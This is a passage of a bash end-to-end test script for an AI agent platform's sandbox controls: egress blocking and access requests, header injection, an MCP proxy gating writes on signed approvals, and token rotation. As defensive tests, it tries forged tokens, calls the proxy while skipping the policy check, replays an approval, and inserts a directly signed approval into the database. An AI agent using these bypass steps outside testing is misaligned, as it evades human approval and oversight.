        "$(psql_kobe "SELECT count(*) FROM files WHERE team_id = '$E2E_TEAM_ID' AND thread_id = '${scan_thread:-00000000-0000-4000-8000-000000000000}'")"
      $KUBECTL -n "$NS" scale deploy/kobe-clamav --replicas=0 >/dev/null 2>&1 || true
      $KUBECTL -n "$NS" wait --for=delete pod -l app.kubernetes.io/component=clamav --timeout=120s >/dev/null 2>&1 || true
      down_out=$(upload_js scan "$scan_thread")
      contains "uploads: with clamd down an upload fails closed (503 scan_unavailable)" '^clean=503:scan_unavailable$' "$down_out"
      if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m --set clamav.enabled=false 2>&1); then
        ok "uploads: chart upgraded back with clamav.enabled=false"
      else fail "uploads: chart upgraded back with clamav.enabled=false: $out"; fi
    fi

    # ac-2: a revoked session token cannot call Bifrost (the member left the team; token unexpired).
    psql_kobe "DELETE FROM team_members WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$MODEL_USER_ID';" >/dev/null
    contains "a revoked session token (member removed) is refused (401)" '^code=401$' \
      "$(until_code 401 openai/gpt-fake "$model_token")"
  else
    fail "the model client pod (sandbox image, gVisor) is ready: $($KUBECTL -n "$TEAM_NS" get pod "$MODEL_CLIENT" \
      -o jsonpath='{.status.phase} {.status.containerStatuses[0].state}' 2>&1)"
  fi
elif [[ "${CI:-}" == "true" ]]; then
  fail "model gateway checks need KOBE_SANDBOX_IMAGE"
else
  echo "SKIP model gateway checks (KOBE_SANDBOX_IMAGE not set)"
fi

# KOBE-39 (Gate 2: "blocked domain → request access → enablement works", U12). A tool in the Owner's
# REAL sandbox is blocked, the Owner asks for access from the thread, the team admin approves, and
# the same tool succeeds. The fake model answers "bash: <command>" with a bash tool call, so Pi runs
# curl through its own bash: HTTPS_PROXY comes from the agent's egress token file via the image's
# BASH_ENV script (no credentials in the pod spec or Pi's environment). The Owner is the team's only
# admin, so it both asks and decides here; that members can't decide is services/server
# egress-requests.db.test.ts. Then header injection: CONNECT to a header domain is refused, and the
# plain-HTTP upgrade verifies the upstream's certificate (the test upstream's is self-signed: 502).
echo "==> request access and header injection (KOBE-39)"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && -n "${owner_id:-}" && -n "${UPSTREAM_HOST:-}" ]] && declare -F as_owner >/dev/null; then
  read -r -d '' EGRESS_JS <<'JS' || true
const [team, content, timeoutMs, threadArg, ask] = process.argv.slice(1);
const base = "http://127.0.0.1:" + process.env.PORT;
const origin = new URL(process.env.KOBE_PUBLIC_URL).origin;
const jar = new Map();
const headers = () => ({ origin, "content-type": "application/json", "x-kobe-team": team,
  cookie: [...jar].map(([k, v]) => k + "=" + v).join("; ") });
const call = async (method, path, body) => {
  const res = await fetch(base + path, { method, headers: headers(), body: body === undefined ? undefined : JSON.stringify(body) });
  for (const c of res.headers.getSetCookie()) { const [pair] = c.split(";"); const at = pair.indexOf("="); jar.set(pair.slice(0, at), pair.slice(at + 1)); }
  const text = await res.text();
  let json = {}; try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
};
const out = (k, v) => console.log(k + "=" + v);
let login;
for (let i = 0; i < 4; i++) {
  login = await call("POST", "/api/auth/sign-in/email", { email: "owner@e2e.test", password: "e2e owner password" });
  if (login.status !== 429) break;
  await new Promise((r) => setTimeout(r, 11000));
}
await call("PUT", "/v1/me/teams/active", { teamId: team });
const threadId = threadArg && threadArg !== "-" ? threadArg : (await call("POST", "/v1/threads", { title: "kobe-39" })).json.thread_id;
out("thread", threadId);
const sent = await call("POST", "/v1/threads/" + threadId + "/messages", { content });
out("message", sent.status);
const runId = sent.json.run_id;
const controller = new AbortController();
const timer = setTimeout(() => controller.abort(), Number(timeoutMs));
let text = "", terminal = "none";
const blocked = [];
try {
  const res = await fetch(base + "/v1/runs/" + runId + "/events", { headers: { ...headers(), accept: "text/event-stream" }, signal: controller.signal });
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  while (terminal === "none") {
    const { done, value } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    let i;
    while ((i = buf.indexOf("\n\n")) >= 0) {
      const block = buf.slice(0, i); buf = buf.slice(i + 2);
      const type = (block.match(/^event: (.*)$/m) || [])[1];
      const data = (block.match(/^data: (.*)$/m) || [])[1];
      if (!type) continue;
      let payload = {}; try { payload = JSON.parse(data).payload ?? {}; } catch {}
      if (type === "egress.blocked") blocked.push(payload.domain + ":" + payload.request_access);
      if (type === "text.delta") text += payload.delta ?? "";
      if (["run.completed", "run.failed", "run.interrupted", "run.budget_stopped"].includes(type)) terminal = type;
    }
  }
} catch (e) { out("stream_error", e.name); }
clearTimeout(timer);
out("terminal", terminal);
out("blocked", blocked.join(",") || "-");
out("text", text.replace(/\s+/g, " "));
if (ask === "ask") {
  // The chat notice's Request access: the blocked domain and this thread.
  const domain = (blocked[0] ?? "").split(":")[0] || process.env.KOBE_E2E_DOMAIN;
  const req = await call("POST", "/v1/egress/requests", { domain, thread_id: threadId });
  out("request", req.status + ":" + (req.json.request?.status ?? req.json.code));
  out("request_id", req.json.request?.id ?? "-");
}
JS
  egress_chat() { # content [thread-id|-] [ask] → key=value lines
    $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- env KOBE_E2E_DOMAIN="$UPSTREAM_HOST" \
      node --input-type=module -e "$EGRESS_JS" "$E2E_TEAM_ID" "$1" 300000 "${2:--}" "${3:-}" 2>&1 | grep -E '^[a-z_]+=' || true
  }
  # Sandbox tools run without approval unless a rule asks (KOBE-37's story left an ask rule on bash);
  # the upstream is in the ceiling (KOBE-38's story) but not enabled for the team.
  psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team';
    DELETE FROM team_egress WHERE team_id = '$E2E_TEAM_ID' AND domain = '$UPSTREAM_HOST';
    INSERT INTO egress_domains (domain, in_ceiling) VALUES ('$UPSTREAM_HOST', true)
      ON CONFLICT (domain) DO UPDATE SET in_ceiling = true;
    SELECT pg_notify('kobe_egress', '$E2E_TEAM_ID'); SELECT pg_notify('kobe_egress', 'ceiling');" >/dev/null
  tool="bash: curl -sSk -m 20 https://$UPSTREAM_HOST/ 2>&1 | head -c 300"
  first=$(egress_chat "$tool" - ask)
  printf '     blocked run: %s\n' "$(printf '%s' "$first" | tr '\n' ' ' | cut -c1-400)"
  e_thread=$(printf '%s\n' "$first" | sed -n 's/^thread=//p')
  contains "the tool's run completed (Pi ran curl through its bash tool)" '^terminal=run.completed$' "$first"
  contains "the tool was blocked by the egress proxy (no team enablement yet)" '^text=.*(403|Kobe egress)' "$first"
  contains "the blocked request reached the run as egress.blocked with request access" \
    "^blocked=.*${UPSTREAM_HOST}:true" "$first"
  contains "the proxy attributed the blocked request to the thread (BASH_ENV proxy user = thread id)" '^[1-9][0-9]*$' \
    "$(psql_kobe "SELECT count(*) FROM events WHERE team_id = '$E2E_TEAM_ID' AND kind = 'egress.blocked'
      AND ref->>'domain' = '$UPSTREAM_HOST' AND ref->>'thread_id' = '${e_thread:-none}'")"
  contains "the member asked for access from the thread (pending)" '^request=201:pending$' "$first"
  e_request=$(printf '%s\n' "$first" | sed -n 's/^request_id=//p')
  contains "the team admin sees the request (domain + thread metadata)" "\"thread_id\":\"${e_thread:-none}\"" \
    "$(as_owner "GET /v1/team/egress/requests")"
  # (as_owner prints the first 400 characters of each answer.)
  contains "the team admin approves the request" '^200 \{"request":\{.*"status":"approved"' \
    "$(as_owner "POST /v1/team/egress/requests/${e_request:-none} {\"decision\":\"approve\"}")"
  contains "the approval enabled the domain for the team" '^1$' \
    "$(psql_kobe "SELECT count(*) FROM team_egress WHERE team_id = '$E2E_TEAM_ID' AND domain = '$UPSTREAM_HOST'")"
  second=$(egress_chat "$tool" "${e_thread:-}")
  printf '     after approval: %s\n' "$(printf '%s' "$second" | tr '\n' ' ' | cut -c1-400)"
  contains "the same tool succeeds after the approval (Gate 2)" '^text=.*s_server' "$second"
  contains "request access is audited (created, decided)" '^egress.request.created,egress.request.decided$' \
    "$(psql_kobe "SELECT string_agg(DISTINCT action, ',' ORDER BY action) FROM audit_log
      WHERE team_id = '$E2E_TEAM_ID' AND action LIKE 'egress.request.%'")"

  # Header injection: the team admin sets a header for the (now enabled) upstream.
  contains "a team admin sets an injected header (write-only)" '^200 .*"header_names":\["X-E2E-Key"\]' \
    "$(as_owner "PUT /v1/team/egress/domains/$UPSTREAM_HOST/headers {\"headers\":[{\"name\":\"X-E2E-Key\",\"value\":\"e2e-header-secret-value\"}]}")"
  if ! as_owner "GET /v1/team/egress" | grep -q 'e2e-header-secret-value'; then ok "the header value is never returned by the API"
  else fail "the header value is never returned by the API"; fi
  if [[ -n "${EGRESS_CLIENT:-}" ]]; then
    h_token=$(mint kobe.egress-proxy)
    h_proxy="http://kobe:$h_token@egress-proxy.kobe.internal:80"
    hdr=$($KUBECTL -n "$TEAM_NS" exec "$EGRESS_CLIENT" -c client -- sh -c "
      for i in \$(seq 1 20); do
        c=\$(curl -sk -m 10 -o /dev/null -w '%{http_connect}' -x '$h_proxy' https://$UPSTREAM_HOST/)
        [ \"\$c\" = 403 ] && break; sleep 1
      done; echo connect=\$c
      curl -s -m 20 -o /dev/null -w 'upgrade=%{http_code}\n' -x '$h_proxy' http://$UPSTREAM_HOST/" 2>&1 || true)
    contains "CONNECT to a header-injected domain is refused (use http://)" '^connect=403$' "$hdr"
    contains "the plain-HTTP upgrade verifies the upstream certificate (self-signed: refused, 502)" '^upgrade=502$' "$hdr"
  else
    fail "header injection checks need the egress client pod (KOBE-38 section)"
  fi
  contains "header changes are audited by name only" '^1$' \
    "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'egress.header.set'
      AND target->'headerNames' = '[\"X-E2E-Key\"]' AND target::text NOT LIKE '%e2e-header-secret-value%'")"
  contains "the header value is stored sealed (never in clear)" '^0$' \
    "$(psql_kobe "SELECT count(*) FROM team_egress WHERE headers_sealed LIKE '%e2e-header-secret-value%'")"
  expect "the team admin removes the header" '^204 ' \
    "$(as_owner "DELETE /v1/team/egress/domains/$UPSTREAM_HOST/headers")"
elif [[ "${CI:-}" == "true" ]]; then
  fail "request access checks need KOBE_SANDBOX_IMAGE and the egress and model sections"
else
  echo "SKIP request access checks (KOBE_SANDBOX_IMAGE not set)"
fi

# KOBE-58: MCP calls go only through the MCP proxy, which asks the server about every call. Gate 2:
# a sandbox with a tampered kobe-policy (here: a client calling the proxy directly, never asking
# policy.check) still cannot execute an MCP write without a signed approval. Runs from the same
# sandbox-like client pod as the egress checks, against a fake remote MCP server in the cluster.
echo "==> MCP proxy (KOBE-58)"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && -n "${sandbox_id:-}" && "${client_ready:-0}" == 1 ]]; then
  FAKE_MCP_JS=$(cat e2e/lib/fake-mcp.js) # shared with e2e/gate2.sh
  $KUBECTL create namespace "$MCP_NS" --dry-run=client -o yaml | $KUBECTL apply -f - >/dev/null
  $KUBECTL -n "$MCP_NS" run fake-mcp --restart=Never --image="$KOBE_SANDBOX_IMAGE" --labels=app=fake-mcp \
    --command -- node -e "$FAKE_MCP_JS" >/dev/null
  $KUBECTL -n "$MCP_NS" expose pod fake-mcp --port=80 --target-port=8080 --name=fake-mcp >/dev/null
  $KUBECTL -n "$MCP_NS" wait --for=condition=Ready pod/fake-mcp --timeout=180s >/dev/null 2>&1 || true
  wait_endpoints "$MCP_NS" fake-mcp
  fake_mcp_ip=$($KUBECTL -n "$MCP_NS" get svc fake-mcp -o jsonpath='{.spec.clusterIP}')
  # Allow exactly that Service IP (proxy check), plain http on port 80 (CI only), and its pods
  # (proxy NetworkPolicy, which matches the pod port after Service translation).
  mcp_rule=$(printf '[{"to":[{"namespaceSelector":{"matchLabels":{"kubernetes.io/metadata.name":"%s"}}}]}]' "$MCP_NS")
  mcp_upgrade_at=$(psql_kobe "SELECT clock_timestamp()")
  server_gen_before=$($KUBECTL -n "$NS" get deploy/kobe-server -o jsonpath='{.metadata.generation}' 2>/dev/null || true)
  if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m \
      --set mcpProxy.allowInsecureHttp=true --set-json 'mcpProxy.allowedPorts=[80]' \
      --set-json "mcpProxy.allowedInternalCidrs=[\"$fake_mcp_ip/32\"]" \
      --set-json "mcpProxy.networkPolicy.extraEgress=$mcp_rule" 2>&1); then ok "MCP proxy reconfigured with the fake MCP server"
  else fail "MCP proxy reconfigured with the fake MCP server: $out"; fi

  # The registry (KOBE-59's admin API later): one connector, two pinned tools, enabled for the team
  # with exposure "all". A thread with an active run leased to the e2e sandbox (as run.start does).
  MCP_CONNECTOR=3c9e1f20-5a4b-4c6d-8e7f-9a0b1c2d3e4f
  MCP_THREAD=4d0f2031-6b5c-4d7e-9f80-0b1c2d3e4f50
  MCP_RUN=5e103142-7c6d-4e8f-a091-1c2d3e4f5061
  pinned() { # name read-only? → one snapshot entry
    printf '{"name":"%s","pi_name":"mcp__e2e_fake__%s","description":"%s (pinned)","input_schema":{"type":"object"},"annotations":%s,"sha256":"%064d","status":"pinned"}' \
      "$1" "$1" "$1" "$2" 0
  }
  snapshot="[$(pinned get_thing '{"readOnlyHint":true}'),$(pinned create_thing '{"destructiveHint":false}')]"
  # KOBE-132: the upgrade above can roll the server, and the e2e sandbox's agent then reconnects at
  # an arbitrary moment. Its hello lists no run for this fixture lease, so the server interrupts it
  # (D14, not_resumed) and the proxy rightly answers "No active run of this thread". Lease the run
  # only once the sandbox has reconnected to the rolled server, so no hello can still follow.
  server_gen_after=$($KUBECTL -n "$NS" get deploy/kobe-server -o jsonpath='{.metadata.generation}' 2>/dev/null || true)
  if [[ "$server_gen_after" != "$server_gen_before" ]]; then
    reconnected=0
    for _ in $(seq 1 120); do
      if [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID'
          AND user_id = '$E2E_USER_ID' AND closed_at IS NULL AND connected_at > '$mcp_upgrade_at'")" == 1 ]]; then
        reconnected=1; break
      fi
      sleep 1
    done
    contains "the e2e sandbox reconnected to the rolled server before the MCP run is leased" '^reconnected=1$' "reconnected=$reconnected"
  fi
  psql_kobe "INSERT INTO connectors (id, name, url, tools_snapshot) VALUES ('$MCP_CONNECTOR', 'e2e-fake', 'http://$fake_mcp_ip/mcp', '$snapshot'::jsonb)
      ON CONFLICT (id) DO UPDATE SET url = EXCLUDED.url, tools_snapshot = EXCLUDED.tools_snapshot;
    INSERT INTO team_connectors (team_id, connector_id, exposure, enabled_by) VALUES ('$E2E_TEAM_ID', '$MCP_CONNECTOR', 'all', '$E2E_USER_ID') ON CONFLICT DO NOTHING;
    INSERT INTO threads (team_id, id, owner_user_id, status) VALUES ('$E2E_TEAM_ID', '$MCP_THREAD', '$E2E_USER_ID', 'running') ON CONFLICT DO NOTHING;
    INSERT INTO runs (team_id, id, thread_id, trigger, status, started_at) VALUES ('$E2E_TEAM_ID', '$MCP_RUN', '$MCP_THREAD', 'user', 'running', now()) ON CONFLICT DO NOTHING;
    INSERT INTO sandbox_run_leases (team_id, run_id, user_id, thread_id, sandbox_id) VALUES ('$E2E_TEAM_ID', '$MCP_RUN', '$E2E_USER_ID', '$MCP_THREAD', '$sandbox_id') ON CONFLICT DO NOTHING;" >/dev/null
  mcp_token=$(mint kobe.mcp-proxy)
  contains "an mcp-proxy session token for the sandbox was minted" '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$' "$mcp_token"
  mcp_proxy_ip=$(svc_ip kobe-mcp-proxy || true)
  mcp_rpc() { # token json-body → the answer body, then "status=<http status>"
    in_sandbox "curl -s -m 30 -w '\nstatus=%{http_code}\n' -H 'authorization: Bearer $1' -H 'content-type: application/json' \
      -H 'accept: application/json, text/event-stream' -H 'kobe-thread-id: $MCP_THREAD' --data-raw '$2' \
      http://$mcp_proxy_ip:80/v1/mcp/$MCP_CONNECTOR"
  }
  # Positive control: the (restarted) proxy answers this pod at all (receiving-side CNI warm-up).
  mcp_up=$(in_sandbox "if $(retry "curl -s -o /dev/null -m 5 -w %{http_code} -X POST http://$mcp_proxy_ip:80/v1/mcp/$MCP_CONNECTOR | grep -q 401" 120); \
    then echo mcp=ANSWERS; else echo mcp=SILENT; fi")
  contains "control: the MCP proxy answers the sandbox-like client" '^mcp=ANSWERS$' "$mcp_up"
  contains "the MCP proxy refuses a forged session token (401)" '^status=401$' \
    "$(mcp_rpc forged.token.value '{"jsonrpc":"2.0","id":1,"method":"tools/list"}')"
  listed=$(mcp_rpc "$mcp_token" '{"jsonrpc":"2.0","id":1,"method":"tools/list"}')
  contains "tools/list serves the connector's pinned tools (exposure all)" '"name":"get_thing".*"name":"create_thing"' "$listed"
  read_call=$(mcp_rpc "$mcp_token" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"get_thing","arguments":{"id":"7"}}}')
  contains "a read-only tool call goes through the proxy to the remote MCP server" 'fake:get_thing' "$read_call"
  write_call=$(mcp_rpc "$mcp_token" '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"create_thing","arguments":{"title":"x"}}}')
  printf '     MCP write without approval: %s\n' "$(printf '%s' "$write_call" | tr '\n' ' ' | cut -c1-200)"
  contains "Gate 2: an MCP write without a signed approval is refused at the proxy" '"isError":true' "$write_call"
  contains "Gate 2: the refusal is the server's policy decision" 'Kobe denied this call' "$write_call"
  fake_log=$($KUBECTL -n "$MCP_NS" logs fake-mcp 2>&1 || true)
  contains "the remote server received the read call (exact input)" '^CALL get_thing \{"id":"7"\}$' "$fake_log"
  expect "Gate 2: the remote server never received the unapproved write" '^(CALL get_thing .*)?$' "$(printf '%s\n' "$fake_log" | grep '^CALL' || true)"
  contains "the sandbox's session token never reaches the remote server" '^0$' "$(printf '%s\n' "$fake_log" | grep -c AUTH-HEADER-PRESENT || true)"
  contains "every MCP decision is in the audit log (mcp.tool_call: allowed and denied)" '^allowed,denied$' \
    "$(psql_kobe "SELECT string_agg(DISTINCT target->>'decision', ',' ORDER BY target->>'decision') FROM audit_log
      WHERE team_id = '$E2E_TEAM_ID' AND action = 'mcp.tool_call'")"
  contains "the denied write is audited with why its approval was missing" '^risk_write\|no_approval$' \
    "$(psql_kobe "SELECT (target->>'reason') || '|' || (target->>'approvalFailure') FROM audit_log
      WHERE team_id = '$E2E_TEAM_ID' AND action = 'mcp.tool_call' AND target->>'decision' = 'denied' ORDER BY seq DESC LIMIT 1")"
  # The user approves the write (KOBE-37 stores and signs it with the install key in the server;
  # here the same row is written directly, signed in the server pod with the real key). The same
  # direct call then runs exactly once.
  approve() { # tool-call-id input-json → kid|expires_at|mac|canonical input
    $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
      const { approvalKeyring } = await import('/app/dist/approvals/keys.js');
      const { signApproval } = await import('/app/node_modules/@kobe/protocol/dist/node/index.js');
      const { canonicalJson } = await import('/app/node_modules/@kobe/protocol/dist/index.js');
      const [tcid, raw] = process.argv.slice(1);
      const input = JSON.parse(raw);
      const t = signApproval({ key: approvalKeyring(process.env.KOBE_APPROVAL_KEY).current,
        approval_id: '6f214253-8d7e-4f90-b1a2-2d3e4f506172', team_id: '$E2E_TEAM_ID', run_id: '$MCP_RUN',
        tool_call_id: tcid, tool: 'mcp__e2e_fake__create_thing', input, now: new Date() });
      console.log([t.kid, t.expires_at, t.mac, canonicalJson(input)].join('|'));
    " "$1" "$2" 2>&1 | tail -1
  }
  signed=$(approve toolu_e2e_1 '{"title":"x"}')
  IFS='|' read -r a_kid a_exp a_mac a_input <<<"$signed"
  psql_kobe "INSERT INTO approvals (team_id, id, run_id, thread_id, connection_id, user_id, tool_call_id, tool, input_canonical,
      risk, reasons, status, cause, decided_by, decided_at, expires_at, token_kid, token_expires_at, input_hmac)
    VALUES ('$E2E_TEAM_ID', '6f214253-8d7e-4f90-b1a2-2d3e4f506172', '$MCP_RUN', '$MCP_THREAD', gen_random_uuid(), '$E2E_USER_ID',
      'toolu_e2e_1', 'mcp__e2e_fake__create_thing', '$a_input', 'write', '[]'::jsonb, 'allowed', 'user',
      '$E2E_USER_ID', now(), now() + interval '1 hour', '$a_kid', '$a_exp', '$a_mac') ON CONFLICT DO NOTHING;" >/dev/null
  approved=$(mcp_rpc "$mcp_token" '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"create_thing","arguments":{"title":"x"}}}')
  contains "Gate 2: with a valid signed approval the same write runs" 'fake:create_thing' "$approved"
  replayed=$(mcp_rpc "$mcp_token" '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"create_thing","arguments":{"title":"x"}}}')
  contains "Gate 2: the approval is used once (a replay is refused)" '"isError":true' "$replayed"
  contains "Gate 2: the remote server received the approved write exactly once" '^1$' \
    "$($KUBECTL -n "$MCP_NS" logs fake-mcp 2>&1 | grep -c '^CALL create_thing ' || true)"
  contains "the approval was consumed and audited (approval.consumed)" '^[1-9][0-9]*$' \
    "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'approval.consumed'")"
  # Sandboxes cannot skip the proxy and ask the server's internal port themselves.
  internal=$(in_sandbox "curl -s -o /dev/null -m 5 http://$server_ip:8081/healthz && echo control=REACHED || echo control=BLOCKED; \
    curl -s -o /dev/null -m 5 http://$server_ip:8082/healthz && echo internal=REACHED || echo internal=BLOCKED")
  contains "control: the sandbox-like client reaches the server's sandbox port" '^control=REACHED$' "$internal"
  contains "sandboxes cannot reach the server's internal port (MCP re-check)" '^internal=BLOCKED$' "$internal"
  # Receiving side: only team namespaces may connect to the proxy (release namespace is refused).
  wait_endpoints "$NS" kobe-server kobe-mcp-proxy
  mcp_recv=$(probe "$NS" "$(gated http://kobe-server/healthz mcp http://kobe-mcp-proxy/healthz)")
  contains "control: the release-namespace probe reaches the server" '^control=REACHED$' "$mcp_recv"
  contains "the MCP proxy admits nothing but sandboxes (probe from the release namespace)" '^mcp=BLOCKED$' "$mcp_recv"
elif [[ "${CI:-}" == "true" ]]; then
  fail "MCP proxy checks need KOBE_SANDBOX_IMAGE, the e2e sandbox and the egress client pod"
else
  echo "SKIP MCP proxy checks (KOBE_SANDBOX_IMAGE not set)"
fi

# KOBE-116 (KOBE-72 ac-2): a chart upgrade that changes the team NetworkPolicy reaches a sandbox that
# is already awake, through the server's reconcile (KOBE-115), without waking or recreating it. The
# team policy's allow-list comes from sandbox.modelGatewayAccess: the upgrade first withdraws the
# model gateway (the sandbox must lose it), then allows it again (the sandbox must gain it, the
# "newly allowed service"). Last section: it rolls the server twice (the sandbox wire reconnects), so
# no run is leased across it; it needs only the e2e sandbox. Waits end on conditions (the reconcile
# log line of a server pod started by the upgrade, then a bounded reachability probe), never sleeps.
# KOBE-168: cold start (hibernated → first token, first tool call) with the executor on or off, and
# KOBE-27 workspace sync with tools under the partner uid. Needs the model setup of the sections above.
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && "$(type -t chat_run)" == function ]]; then
  source e2e/executor/trials.sh
  executor_first_token_trials
  if [[ "${KOBE_E2E_TOOL_EXECUTOR:-}" == 1 ]]; then executor_sync_checks; fi
fi

# KOBE-241 (KOBE-111 ac-2): a real Pi makes an MCP call, the sandbox session tokens rotate past their
# TTL, and the next MCP call in the same thread still succeeds. Pi resolves the Authorization header
# only when it connects; the mcp-proxy answers 404 to an expired token on the kept Mcp-Session-Id, so
# Pi reconnects, re-reads the rotated token file and retries. The install shortens the token TTL to
# 15 s for this (server.sessionTokenTtlSeconds, 10..900); the 116 section below restores 900. The
# owner's sandbox is hibernated first so its next wake trades tokens of the short TTL. Needs the MCP
# fixture (connector e2e-fake) and the fake model.
echo "==> real Pi past an MCP token rotation (KOBE-241)"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && "$(type -t chat_run)" == function && -n "${MCP_CONNECTOR:-}" && -n "${owner_id:-}" ]]; then
  ROT_TTL=15
  ROT_AGENT=6a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d
  rot_t0=$SECONDS
  # A published personal agent of the owner: the assistant's definition plus the e2e-fake connector.
  psql_kobe "DELETE FROM install_agents WHERE id = '$ROT_AGENT' AND current_version IS NULL;
    INSERT INTO install_agents (id, scope, owner_user_id, slug, frontmatter, prompt)
      SELECT '$ROT_AGENT', 'personal', '$owner_id', 'e2e-mcp-rotation',
        (a.frontmatter - 'tools') || '{\"name\":\"E2E MCP rotation\",\"connectors\":[\"e2e-fake\"]}'::jsonb, a.prompt
      FROM install_agents a WHERE a.gallery_key = 'assistant' ON CONFLICT DO NOTHING;
    INSERT INTO install_agent_versions (agent_id, version, frontmatter, prompt, tool_manifest, draft_revision)
      SELECT a.id, 1, a.frontmatter, a.prompt,
        (SELECT v.tool_manifest FROM install_agent_versions v JOIN install_agents g ON g.id = v.agent_id AND v.version = g.current_version
          WHERE g.gallery_key = 'assistant') || '{\"connectors\":[\"e2e-fake\"]}'::jsonb, 1
      FROM install_agents a WHERE a.id = '$ROT_AGENT' ON CONFLICT DO NOTHING;
    UPDATE install_agents SET current_version = 1 WHERE id = '$ROT_AGENT';" >/dev/null
  contains "the owner has a published agent with the e2e-fake connector" '^1$' \
    "$(psql_kobe "SELECT current_version FROM install_agents WHERE id = '$ROT_AGENT'")"
  owner_lifecycle() { # hibernate|wake for the owner's sandbox
    $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node dist/cli/lifecycle.js "$1" \
      --team-id "$E2E_TEAM_ID" --user-id "$owner_id" 2>&1 | grep -E '^\{"(hibernated|woken)"' || true
  }
  owner_lifecycle hibernate >/dev/null
  if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m \
      --set "server.sessionTokenTtlSeconds=$ROT_TTL" 2>&1); then ok "session tokens now live $ROT_TTL s (test install)"
  else fail "session tokens now live $ROT_TTL s (test install): $out"; fi
  rot_calls() { $KUBECTL -n "$MCP_NS" logs fake-mcp 2>&1 | grep -c '^CALL get_thing ' || true; }
  rot_before=$(rot_calls)
  rot_t1=$SECONDS
  rot1=$(chat_run 'tool: mcp__e2e_fake__get_thing {"id":"101"}' 240000 "" "$ROT_AGENT" "" 1)
  printf '     rotation, before: %s\n' "$(printf '%s' "$rot1" | grep -v '^text=' | tr '\n' ' ' | cut -c1-300)"
  rot_thread=$(printf '%s\n' "$rot1" | sed -n 's/^thread_id=//p')
  contains "before the rotation: Pi's MCP call through the proxy succeeded" '^terminal=run.completed$' "$rot1"
  contains "before the rotation: the model saw the fake server's answer" 'tool said: .*fake:get_thing' "$rot1"
  rot_t2=$SECONDS
  # Past the token's life: the token Pi connected with is now expired, the file holds a newer one.
  sleep $((ROT_TTL + 2))
  rot2=$(chat_run 'tool: mcp__e2e_fake__get_thing {"id":"102"}' 240000 "" "$ROT_AGENT" "$rot_thread" 1)
  printf '     rotation, after: %s\n' "$(printf '%s' "$rot2" | grep -v '^text=' | tr '\n' ' ' | cut -c1-300)"
  contains "after the rotation: the same thread's MCP call succeeded" '^terminal=run.completed$' "$rot2"
  contains "after the rotation: the model saw the fake server's answer" 'tool said: .*fake:get_thing' "$rot2"
  contains "each call ran exactly once on the fake MCP server (a 404 retry never runs the call twice)" '^2$' "$(( $(rot_calls) - rot_before ))"
  contains "the mcp-proxy answered an expired token on the live session with 404 (Pi reconnected)" '^[1-9][0-9]*$' \
    "$($KUBECTL -n "$NS" logs -l app.kubernetes.io/component=mcp-proxy --tail=-1 --since=15m 2>/dev/null \
      | grep -c 'expired token on a live session; answered 404' || true)"
  printf '     rotation e2e: %ss in all (setup %ss, first run %ss)\n' "$((SECONDS - rot_t0))" "$((rot_t1 - rot_t0))" "$((rot_t2 - rot_t1))"
elif [[ "${CI:-}" == "true" ]]; then
  fail "the MCP token rotation check needs KOBE_SANDBOX_IMAGE, the MCP fixture and the model setup"
else
  echo "SKIP MCP token rotation check (KOBE-241: needs the MCP fixture and the model setup)"
fi

echo "==> chart upgrade reaches an awake sandbox (KOBE-116)"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && -n "${sandbox_id:-}" ]]; then
  # Exit status = reachability, from the real agent container; --noproxy: the pod's HTTP_PROXY
  # would otherwise send the request through the egress proxy.
  sbx_reaches() { # url
    $KUBECTL -n "$TEAM_NS" exec "$(sandbox_pod_name)" -c agent -- curl -sf --noproxy '*' -m 3 -o /dev/null "$1" >/dev/null 2>&1
  }
  sbx_cannot_reach() { ! sbx_reaches "$1"; }
  sbx_uid() { $KUBECTL -n "$TEAM_NS" get pod "$(sandbox_pod_name)" -o jsonpath='{.metadata.uid}' 2>/dev/null; }
  server_pods() { $KUBECTL -n "$NS" get pods -l app.kubernetes.io/component=server -o name | sort; }
  # Newest reconcile summary with changed policy from a server pod that did not exist before the
  # upgrade (given as $1, a sorted list of pod names): only a pass of the new config counts.
  changed_summary() {
    local pod
    for pod in $(server_pods | grep -vxF -f <(printf '%s\n' "$1" | sed 's/^$/-none-/')); do
      $KUBECTL -n "$NS" logs "$pod" -c server 2>/dev/null || true
    done | grep '"msg":"team namespaces reconciled"' | grep '"policyChanged":[1-9]' | tail -n 1 || true
  }
  upgrade_gateway_access() { # true|false → sets the flag; prints the helm output
    $HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m \
      --set "sandbox.modelGatewayAccess=$1" --set server.sessionTokenTtlSeconds=900 2>&1
  }

  mg_url="http://$(svc_ip kobe-model-gateway)/healthz"
  server_url="http://$(svc_ip kobe-server):8081/healthz"
  # The sandbox is awake and connected when the section starts (hibernation is off the path here).
  if ! pod_running; then lifecycle wake >/dev/null; fi
  until_ok 120 pod_running || true
  until_ok 120 wire_open || true
